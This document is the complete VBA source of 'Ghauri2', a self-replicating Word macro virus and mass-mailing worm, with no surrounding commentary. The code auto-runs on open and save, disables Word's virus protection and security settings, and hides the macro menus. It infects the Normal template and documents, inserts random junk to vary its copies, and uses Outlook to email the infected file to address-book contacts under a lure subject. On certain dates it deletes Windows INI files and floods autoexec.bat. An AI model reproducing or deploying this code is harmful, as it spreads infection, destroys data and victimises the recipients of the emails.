Sub AutoOpen()
On Error Resume Next
If ActiveDocument.SaveFormat = 0 Then
Ghauri2
End If
End Sub
Sub ViewVBCode()
End Sub
Sub FileSave()
On Error Resume Next
If ActiveDocument.SaveFormat = 0 Then
Ghauri2
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
End Sub
Private Sub Stealth()
On Error Resume Next
Application.DisplayAlerts = False
Application.DisplayStatusBar = False
Application.EnableCancelKey = False
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("tools").Controls("Templates and Add-Ins...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("Format").Controls("Style...").Enabled = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
End Sub
Private Sub WormAction()
On Error Resume Next
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
For x = 1 To DasMapiName.AddressLists.Count
Set AddyBook = DasMapiName.AddressLists(x)
y = 1
Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
For z = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(y)
BreakUmOffASlice.Recipients.Add Peep
y = y + 1
If y > 50 Then z = AddyBook.AddressEntries.Count
Next z
BreakUmOffASlice.Subject = "A Piece of Information From " & Application.UserName
BreakUmOffASlice.Body = "Here is some thing about EME College that you better know..."
BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
BreakUmOffASlice.Send
Peep = ""
Next x
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "! Ghauri2 !") = "This machine salutes to GodOfBasic"
End Sub
Private Sub Ghauri2()
On Error Resume Next
Stealth
NotInNT = True: NotInAD = True
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(I).Name = "Ghauri2" Then NotInNT = False
Next
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents.Item(I).Name = "Ghauri2" Then NotInAD = False
Next
If NotInNT = True Then
WormAction
ActiveDocument.VBProject.VBComponents("Ghauri2").Export "c:\winio.vxd" 'Exports to File
Set Dobj = NormalTemplate.VBProject                                    'Set Victim
End If
If NotInAD = True Then
NormalTemplate.VBProject.VBComponents("Ghauri2").Export "c:\winio.vxd" 'Exports to File
Set Dobj = ActiveDocument.VBProject                                    'Set Victim
End If
If NotInNT = False And NotInAD = False Then GoTo NoNeed
Open "c:\winio.vxd" For Input As #1
Open "c:\winio2.vxd" For Output As #2
Looper:
Line Input #1, A$
If A$ <> "Sub AutoOpen()" Then GoTo Looper
VirusName$ = "Attribute VB_Name =" + Chr$(34) + "Ghauri2" + Chr$(34)
Print #2, VirusName$
Do
Print #2, A$
Line Input #1, A$
Loop Until A$ = "'Ghauri2"
Print #2, A$
Garbage (5)
Close #2: Close #1
A = 65
Fname$ = Chr$(58) + Chr$(92) + Chr$(119) + Chr$(105) + Chr$(110) + Chr$(105) + Chr$(111) + "2." + Chr$(118) + Chr$(120)
File$ = Chr$(Asc(Chr$(Asc(Chr$(Asc(Chr$(A + 2))))))) + Fname$ + Chr$(100)
If NotInNT = True Or NotInAD = True Then Dobj.VBComponents.Import (File$)
If NotInAD = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Kill "c:\winio.vxd": Kill "c:\winio2.vxd"
NoNeed:
Trigger
End Sub
Private Sub Garbage(A As Integer)
On Error Resume Next
For I = 1 To Int(Rnd * A)
Dummy$ = Space$(Int(Rnd * 3)) + "'"
For J = 1 To Int(Rnd * 5 + 1)
Dummy$ = Dummy$ + Chr$(Int(Rnd * 80) + 33)
Next
Print #2, Dummy$
Next
End Sub
Private Sub Trigger()
On Error Resume Next
GOBsEvent = Format(Date, "dd-mm")
Select Case (GOBsEvent)
Case "11-06"
MyMessage$ = "Say Happy Birthday to GodOfBasic! He is" + Str$(Format(Date, "yyyy") - 1978) + " years old today."
Case "28-05"
MyMessage$ = "This machine is struck by the great GHAURI2 Virus !!! ...coded by GodOfBasic"
Kill "c:\windows\*.INI"
Case "14-08"
MyMessage$ = "It's 14th Aug. Say Happy Birthday to Pakistan !!!  ...Ghauri2"
Case "25-03"
MyMessage$ = "25th March 1997, A memorable day of my life?  ...Ghauri2"
Case Else
If Int(Rnd * 1000) <> 786 Then GoTo EndTrigger
End Select
Open "c:\autoexec.bat" For Append As #1
Print #1, "@ECHO OFF"
For I = 1 To 1000: Print #1, "echo " + MyMessage$: Next
Close #1
EndTrigger:
End Sub
'(c); coded by GodOfBasic     (bangash259@yahoo.com)
'Ghauri2
'cb
 'i3Xo4
 'p
